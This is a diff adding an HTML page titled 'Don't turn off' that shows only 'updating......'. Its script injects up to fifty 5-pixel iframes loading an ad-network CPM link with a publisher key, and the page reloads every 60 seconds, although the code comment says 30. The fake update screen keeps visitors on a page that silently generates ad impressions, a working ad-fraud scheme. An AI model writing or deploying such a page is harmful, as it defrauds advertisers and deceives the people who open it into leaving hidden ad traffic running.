@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Don't turn off</title>
+  <style>
+    iframe{
+      width:5px;
+      height:5px;
+    }
+  </style>
+</head>
+
+<body>
+  updating......
+</body>
+
+<script>
+ function appendIfFrames(tag, index = 0, html) {
+  const el = document.getElementsByTagName(tag)[index];
+  if (el) el.innerHTML += html;
+}
+function getRandomInteger(min, max) {
+  return Math.floor(Math.random() * (max - min + 1)) + min;
+}
+var num=getRandomInteger(0,50);
+console.log(num);
+const iframes = `<iframe src="https://www.effectivegatecpm.com/pi1cuuttj?key=2a3b81321c5b0fcc130d8b2f0ba7d734" title="test">
+</iframe>`;
+appendIfFrames("body", 0, iframes.repeat(num));
+
+
+</script>
+ <script>
+    // Refresh the window every 30000 milliseconds (30 seconds)
+    setInterval(function() {
+      location.reload();
+    }, 60000);
+  </script>
+</html>
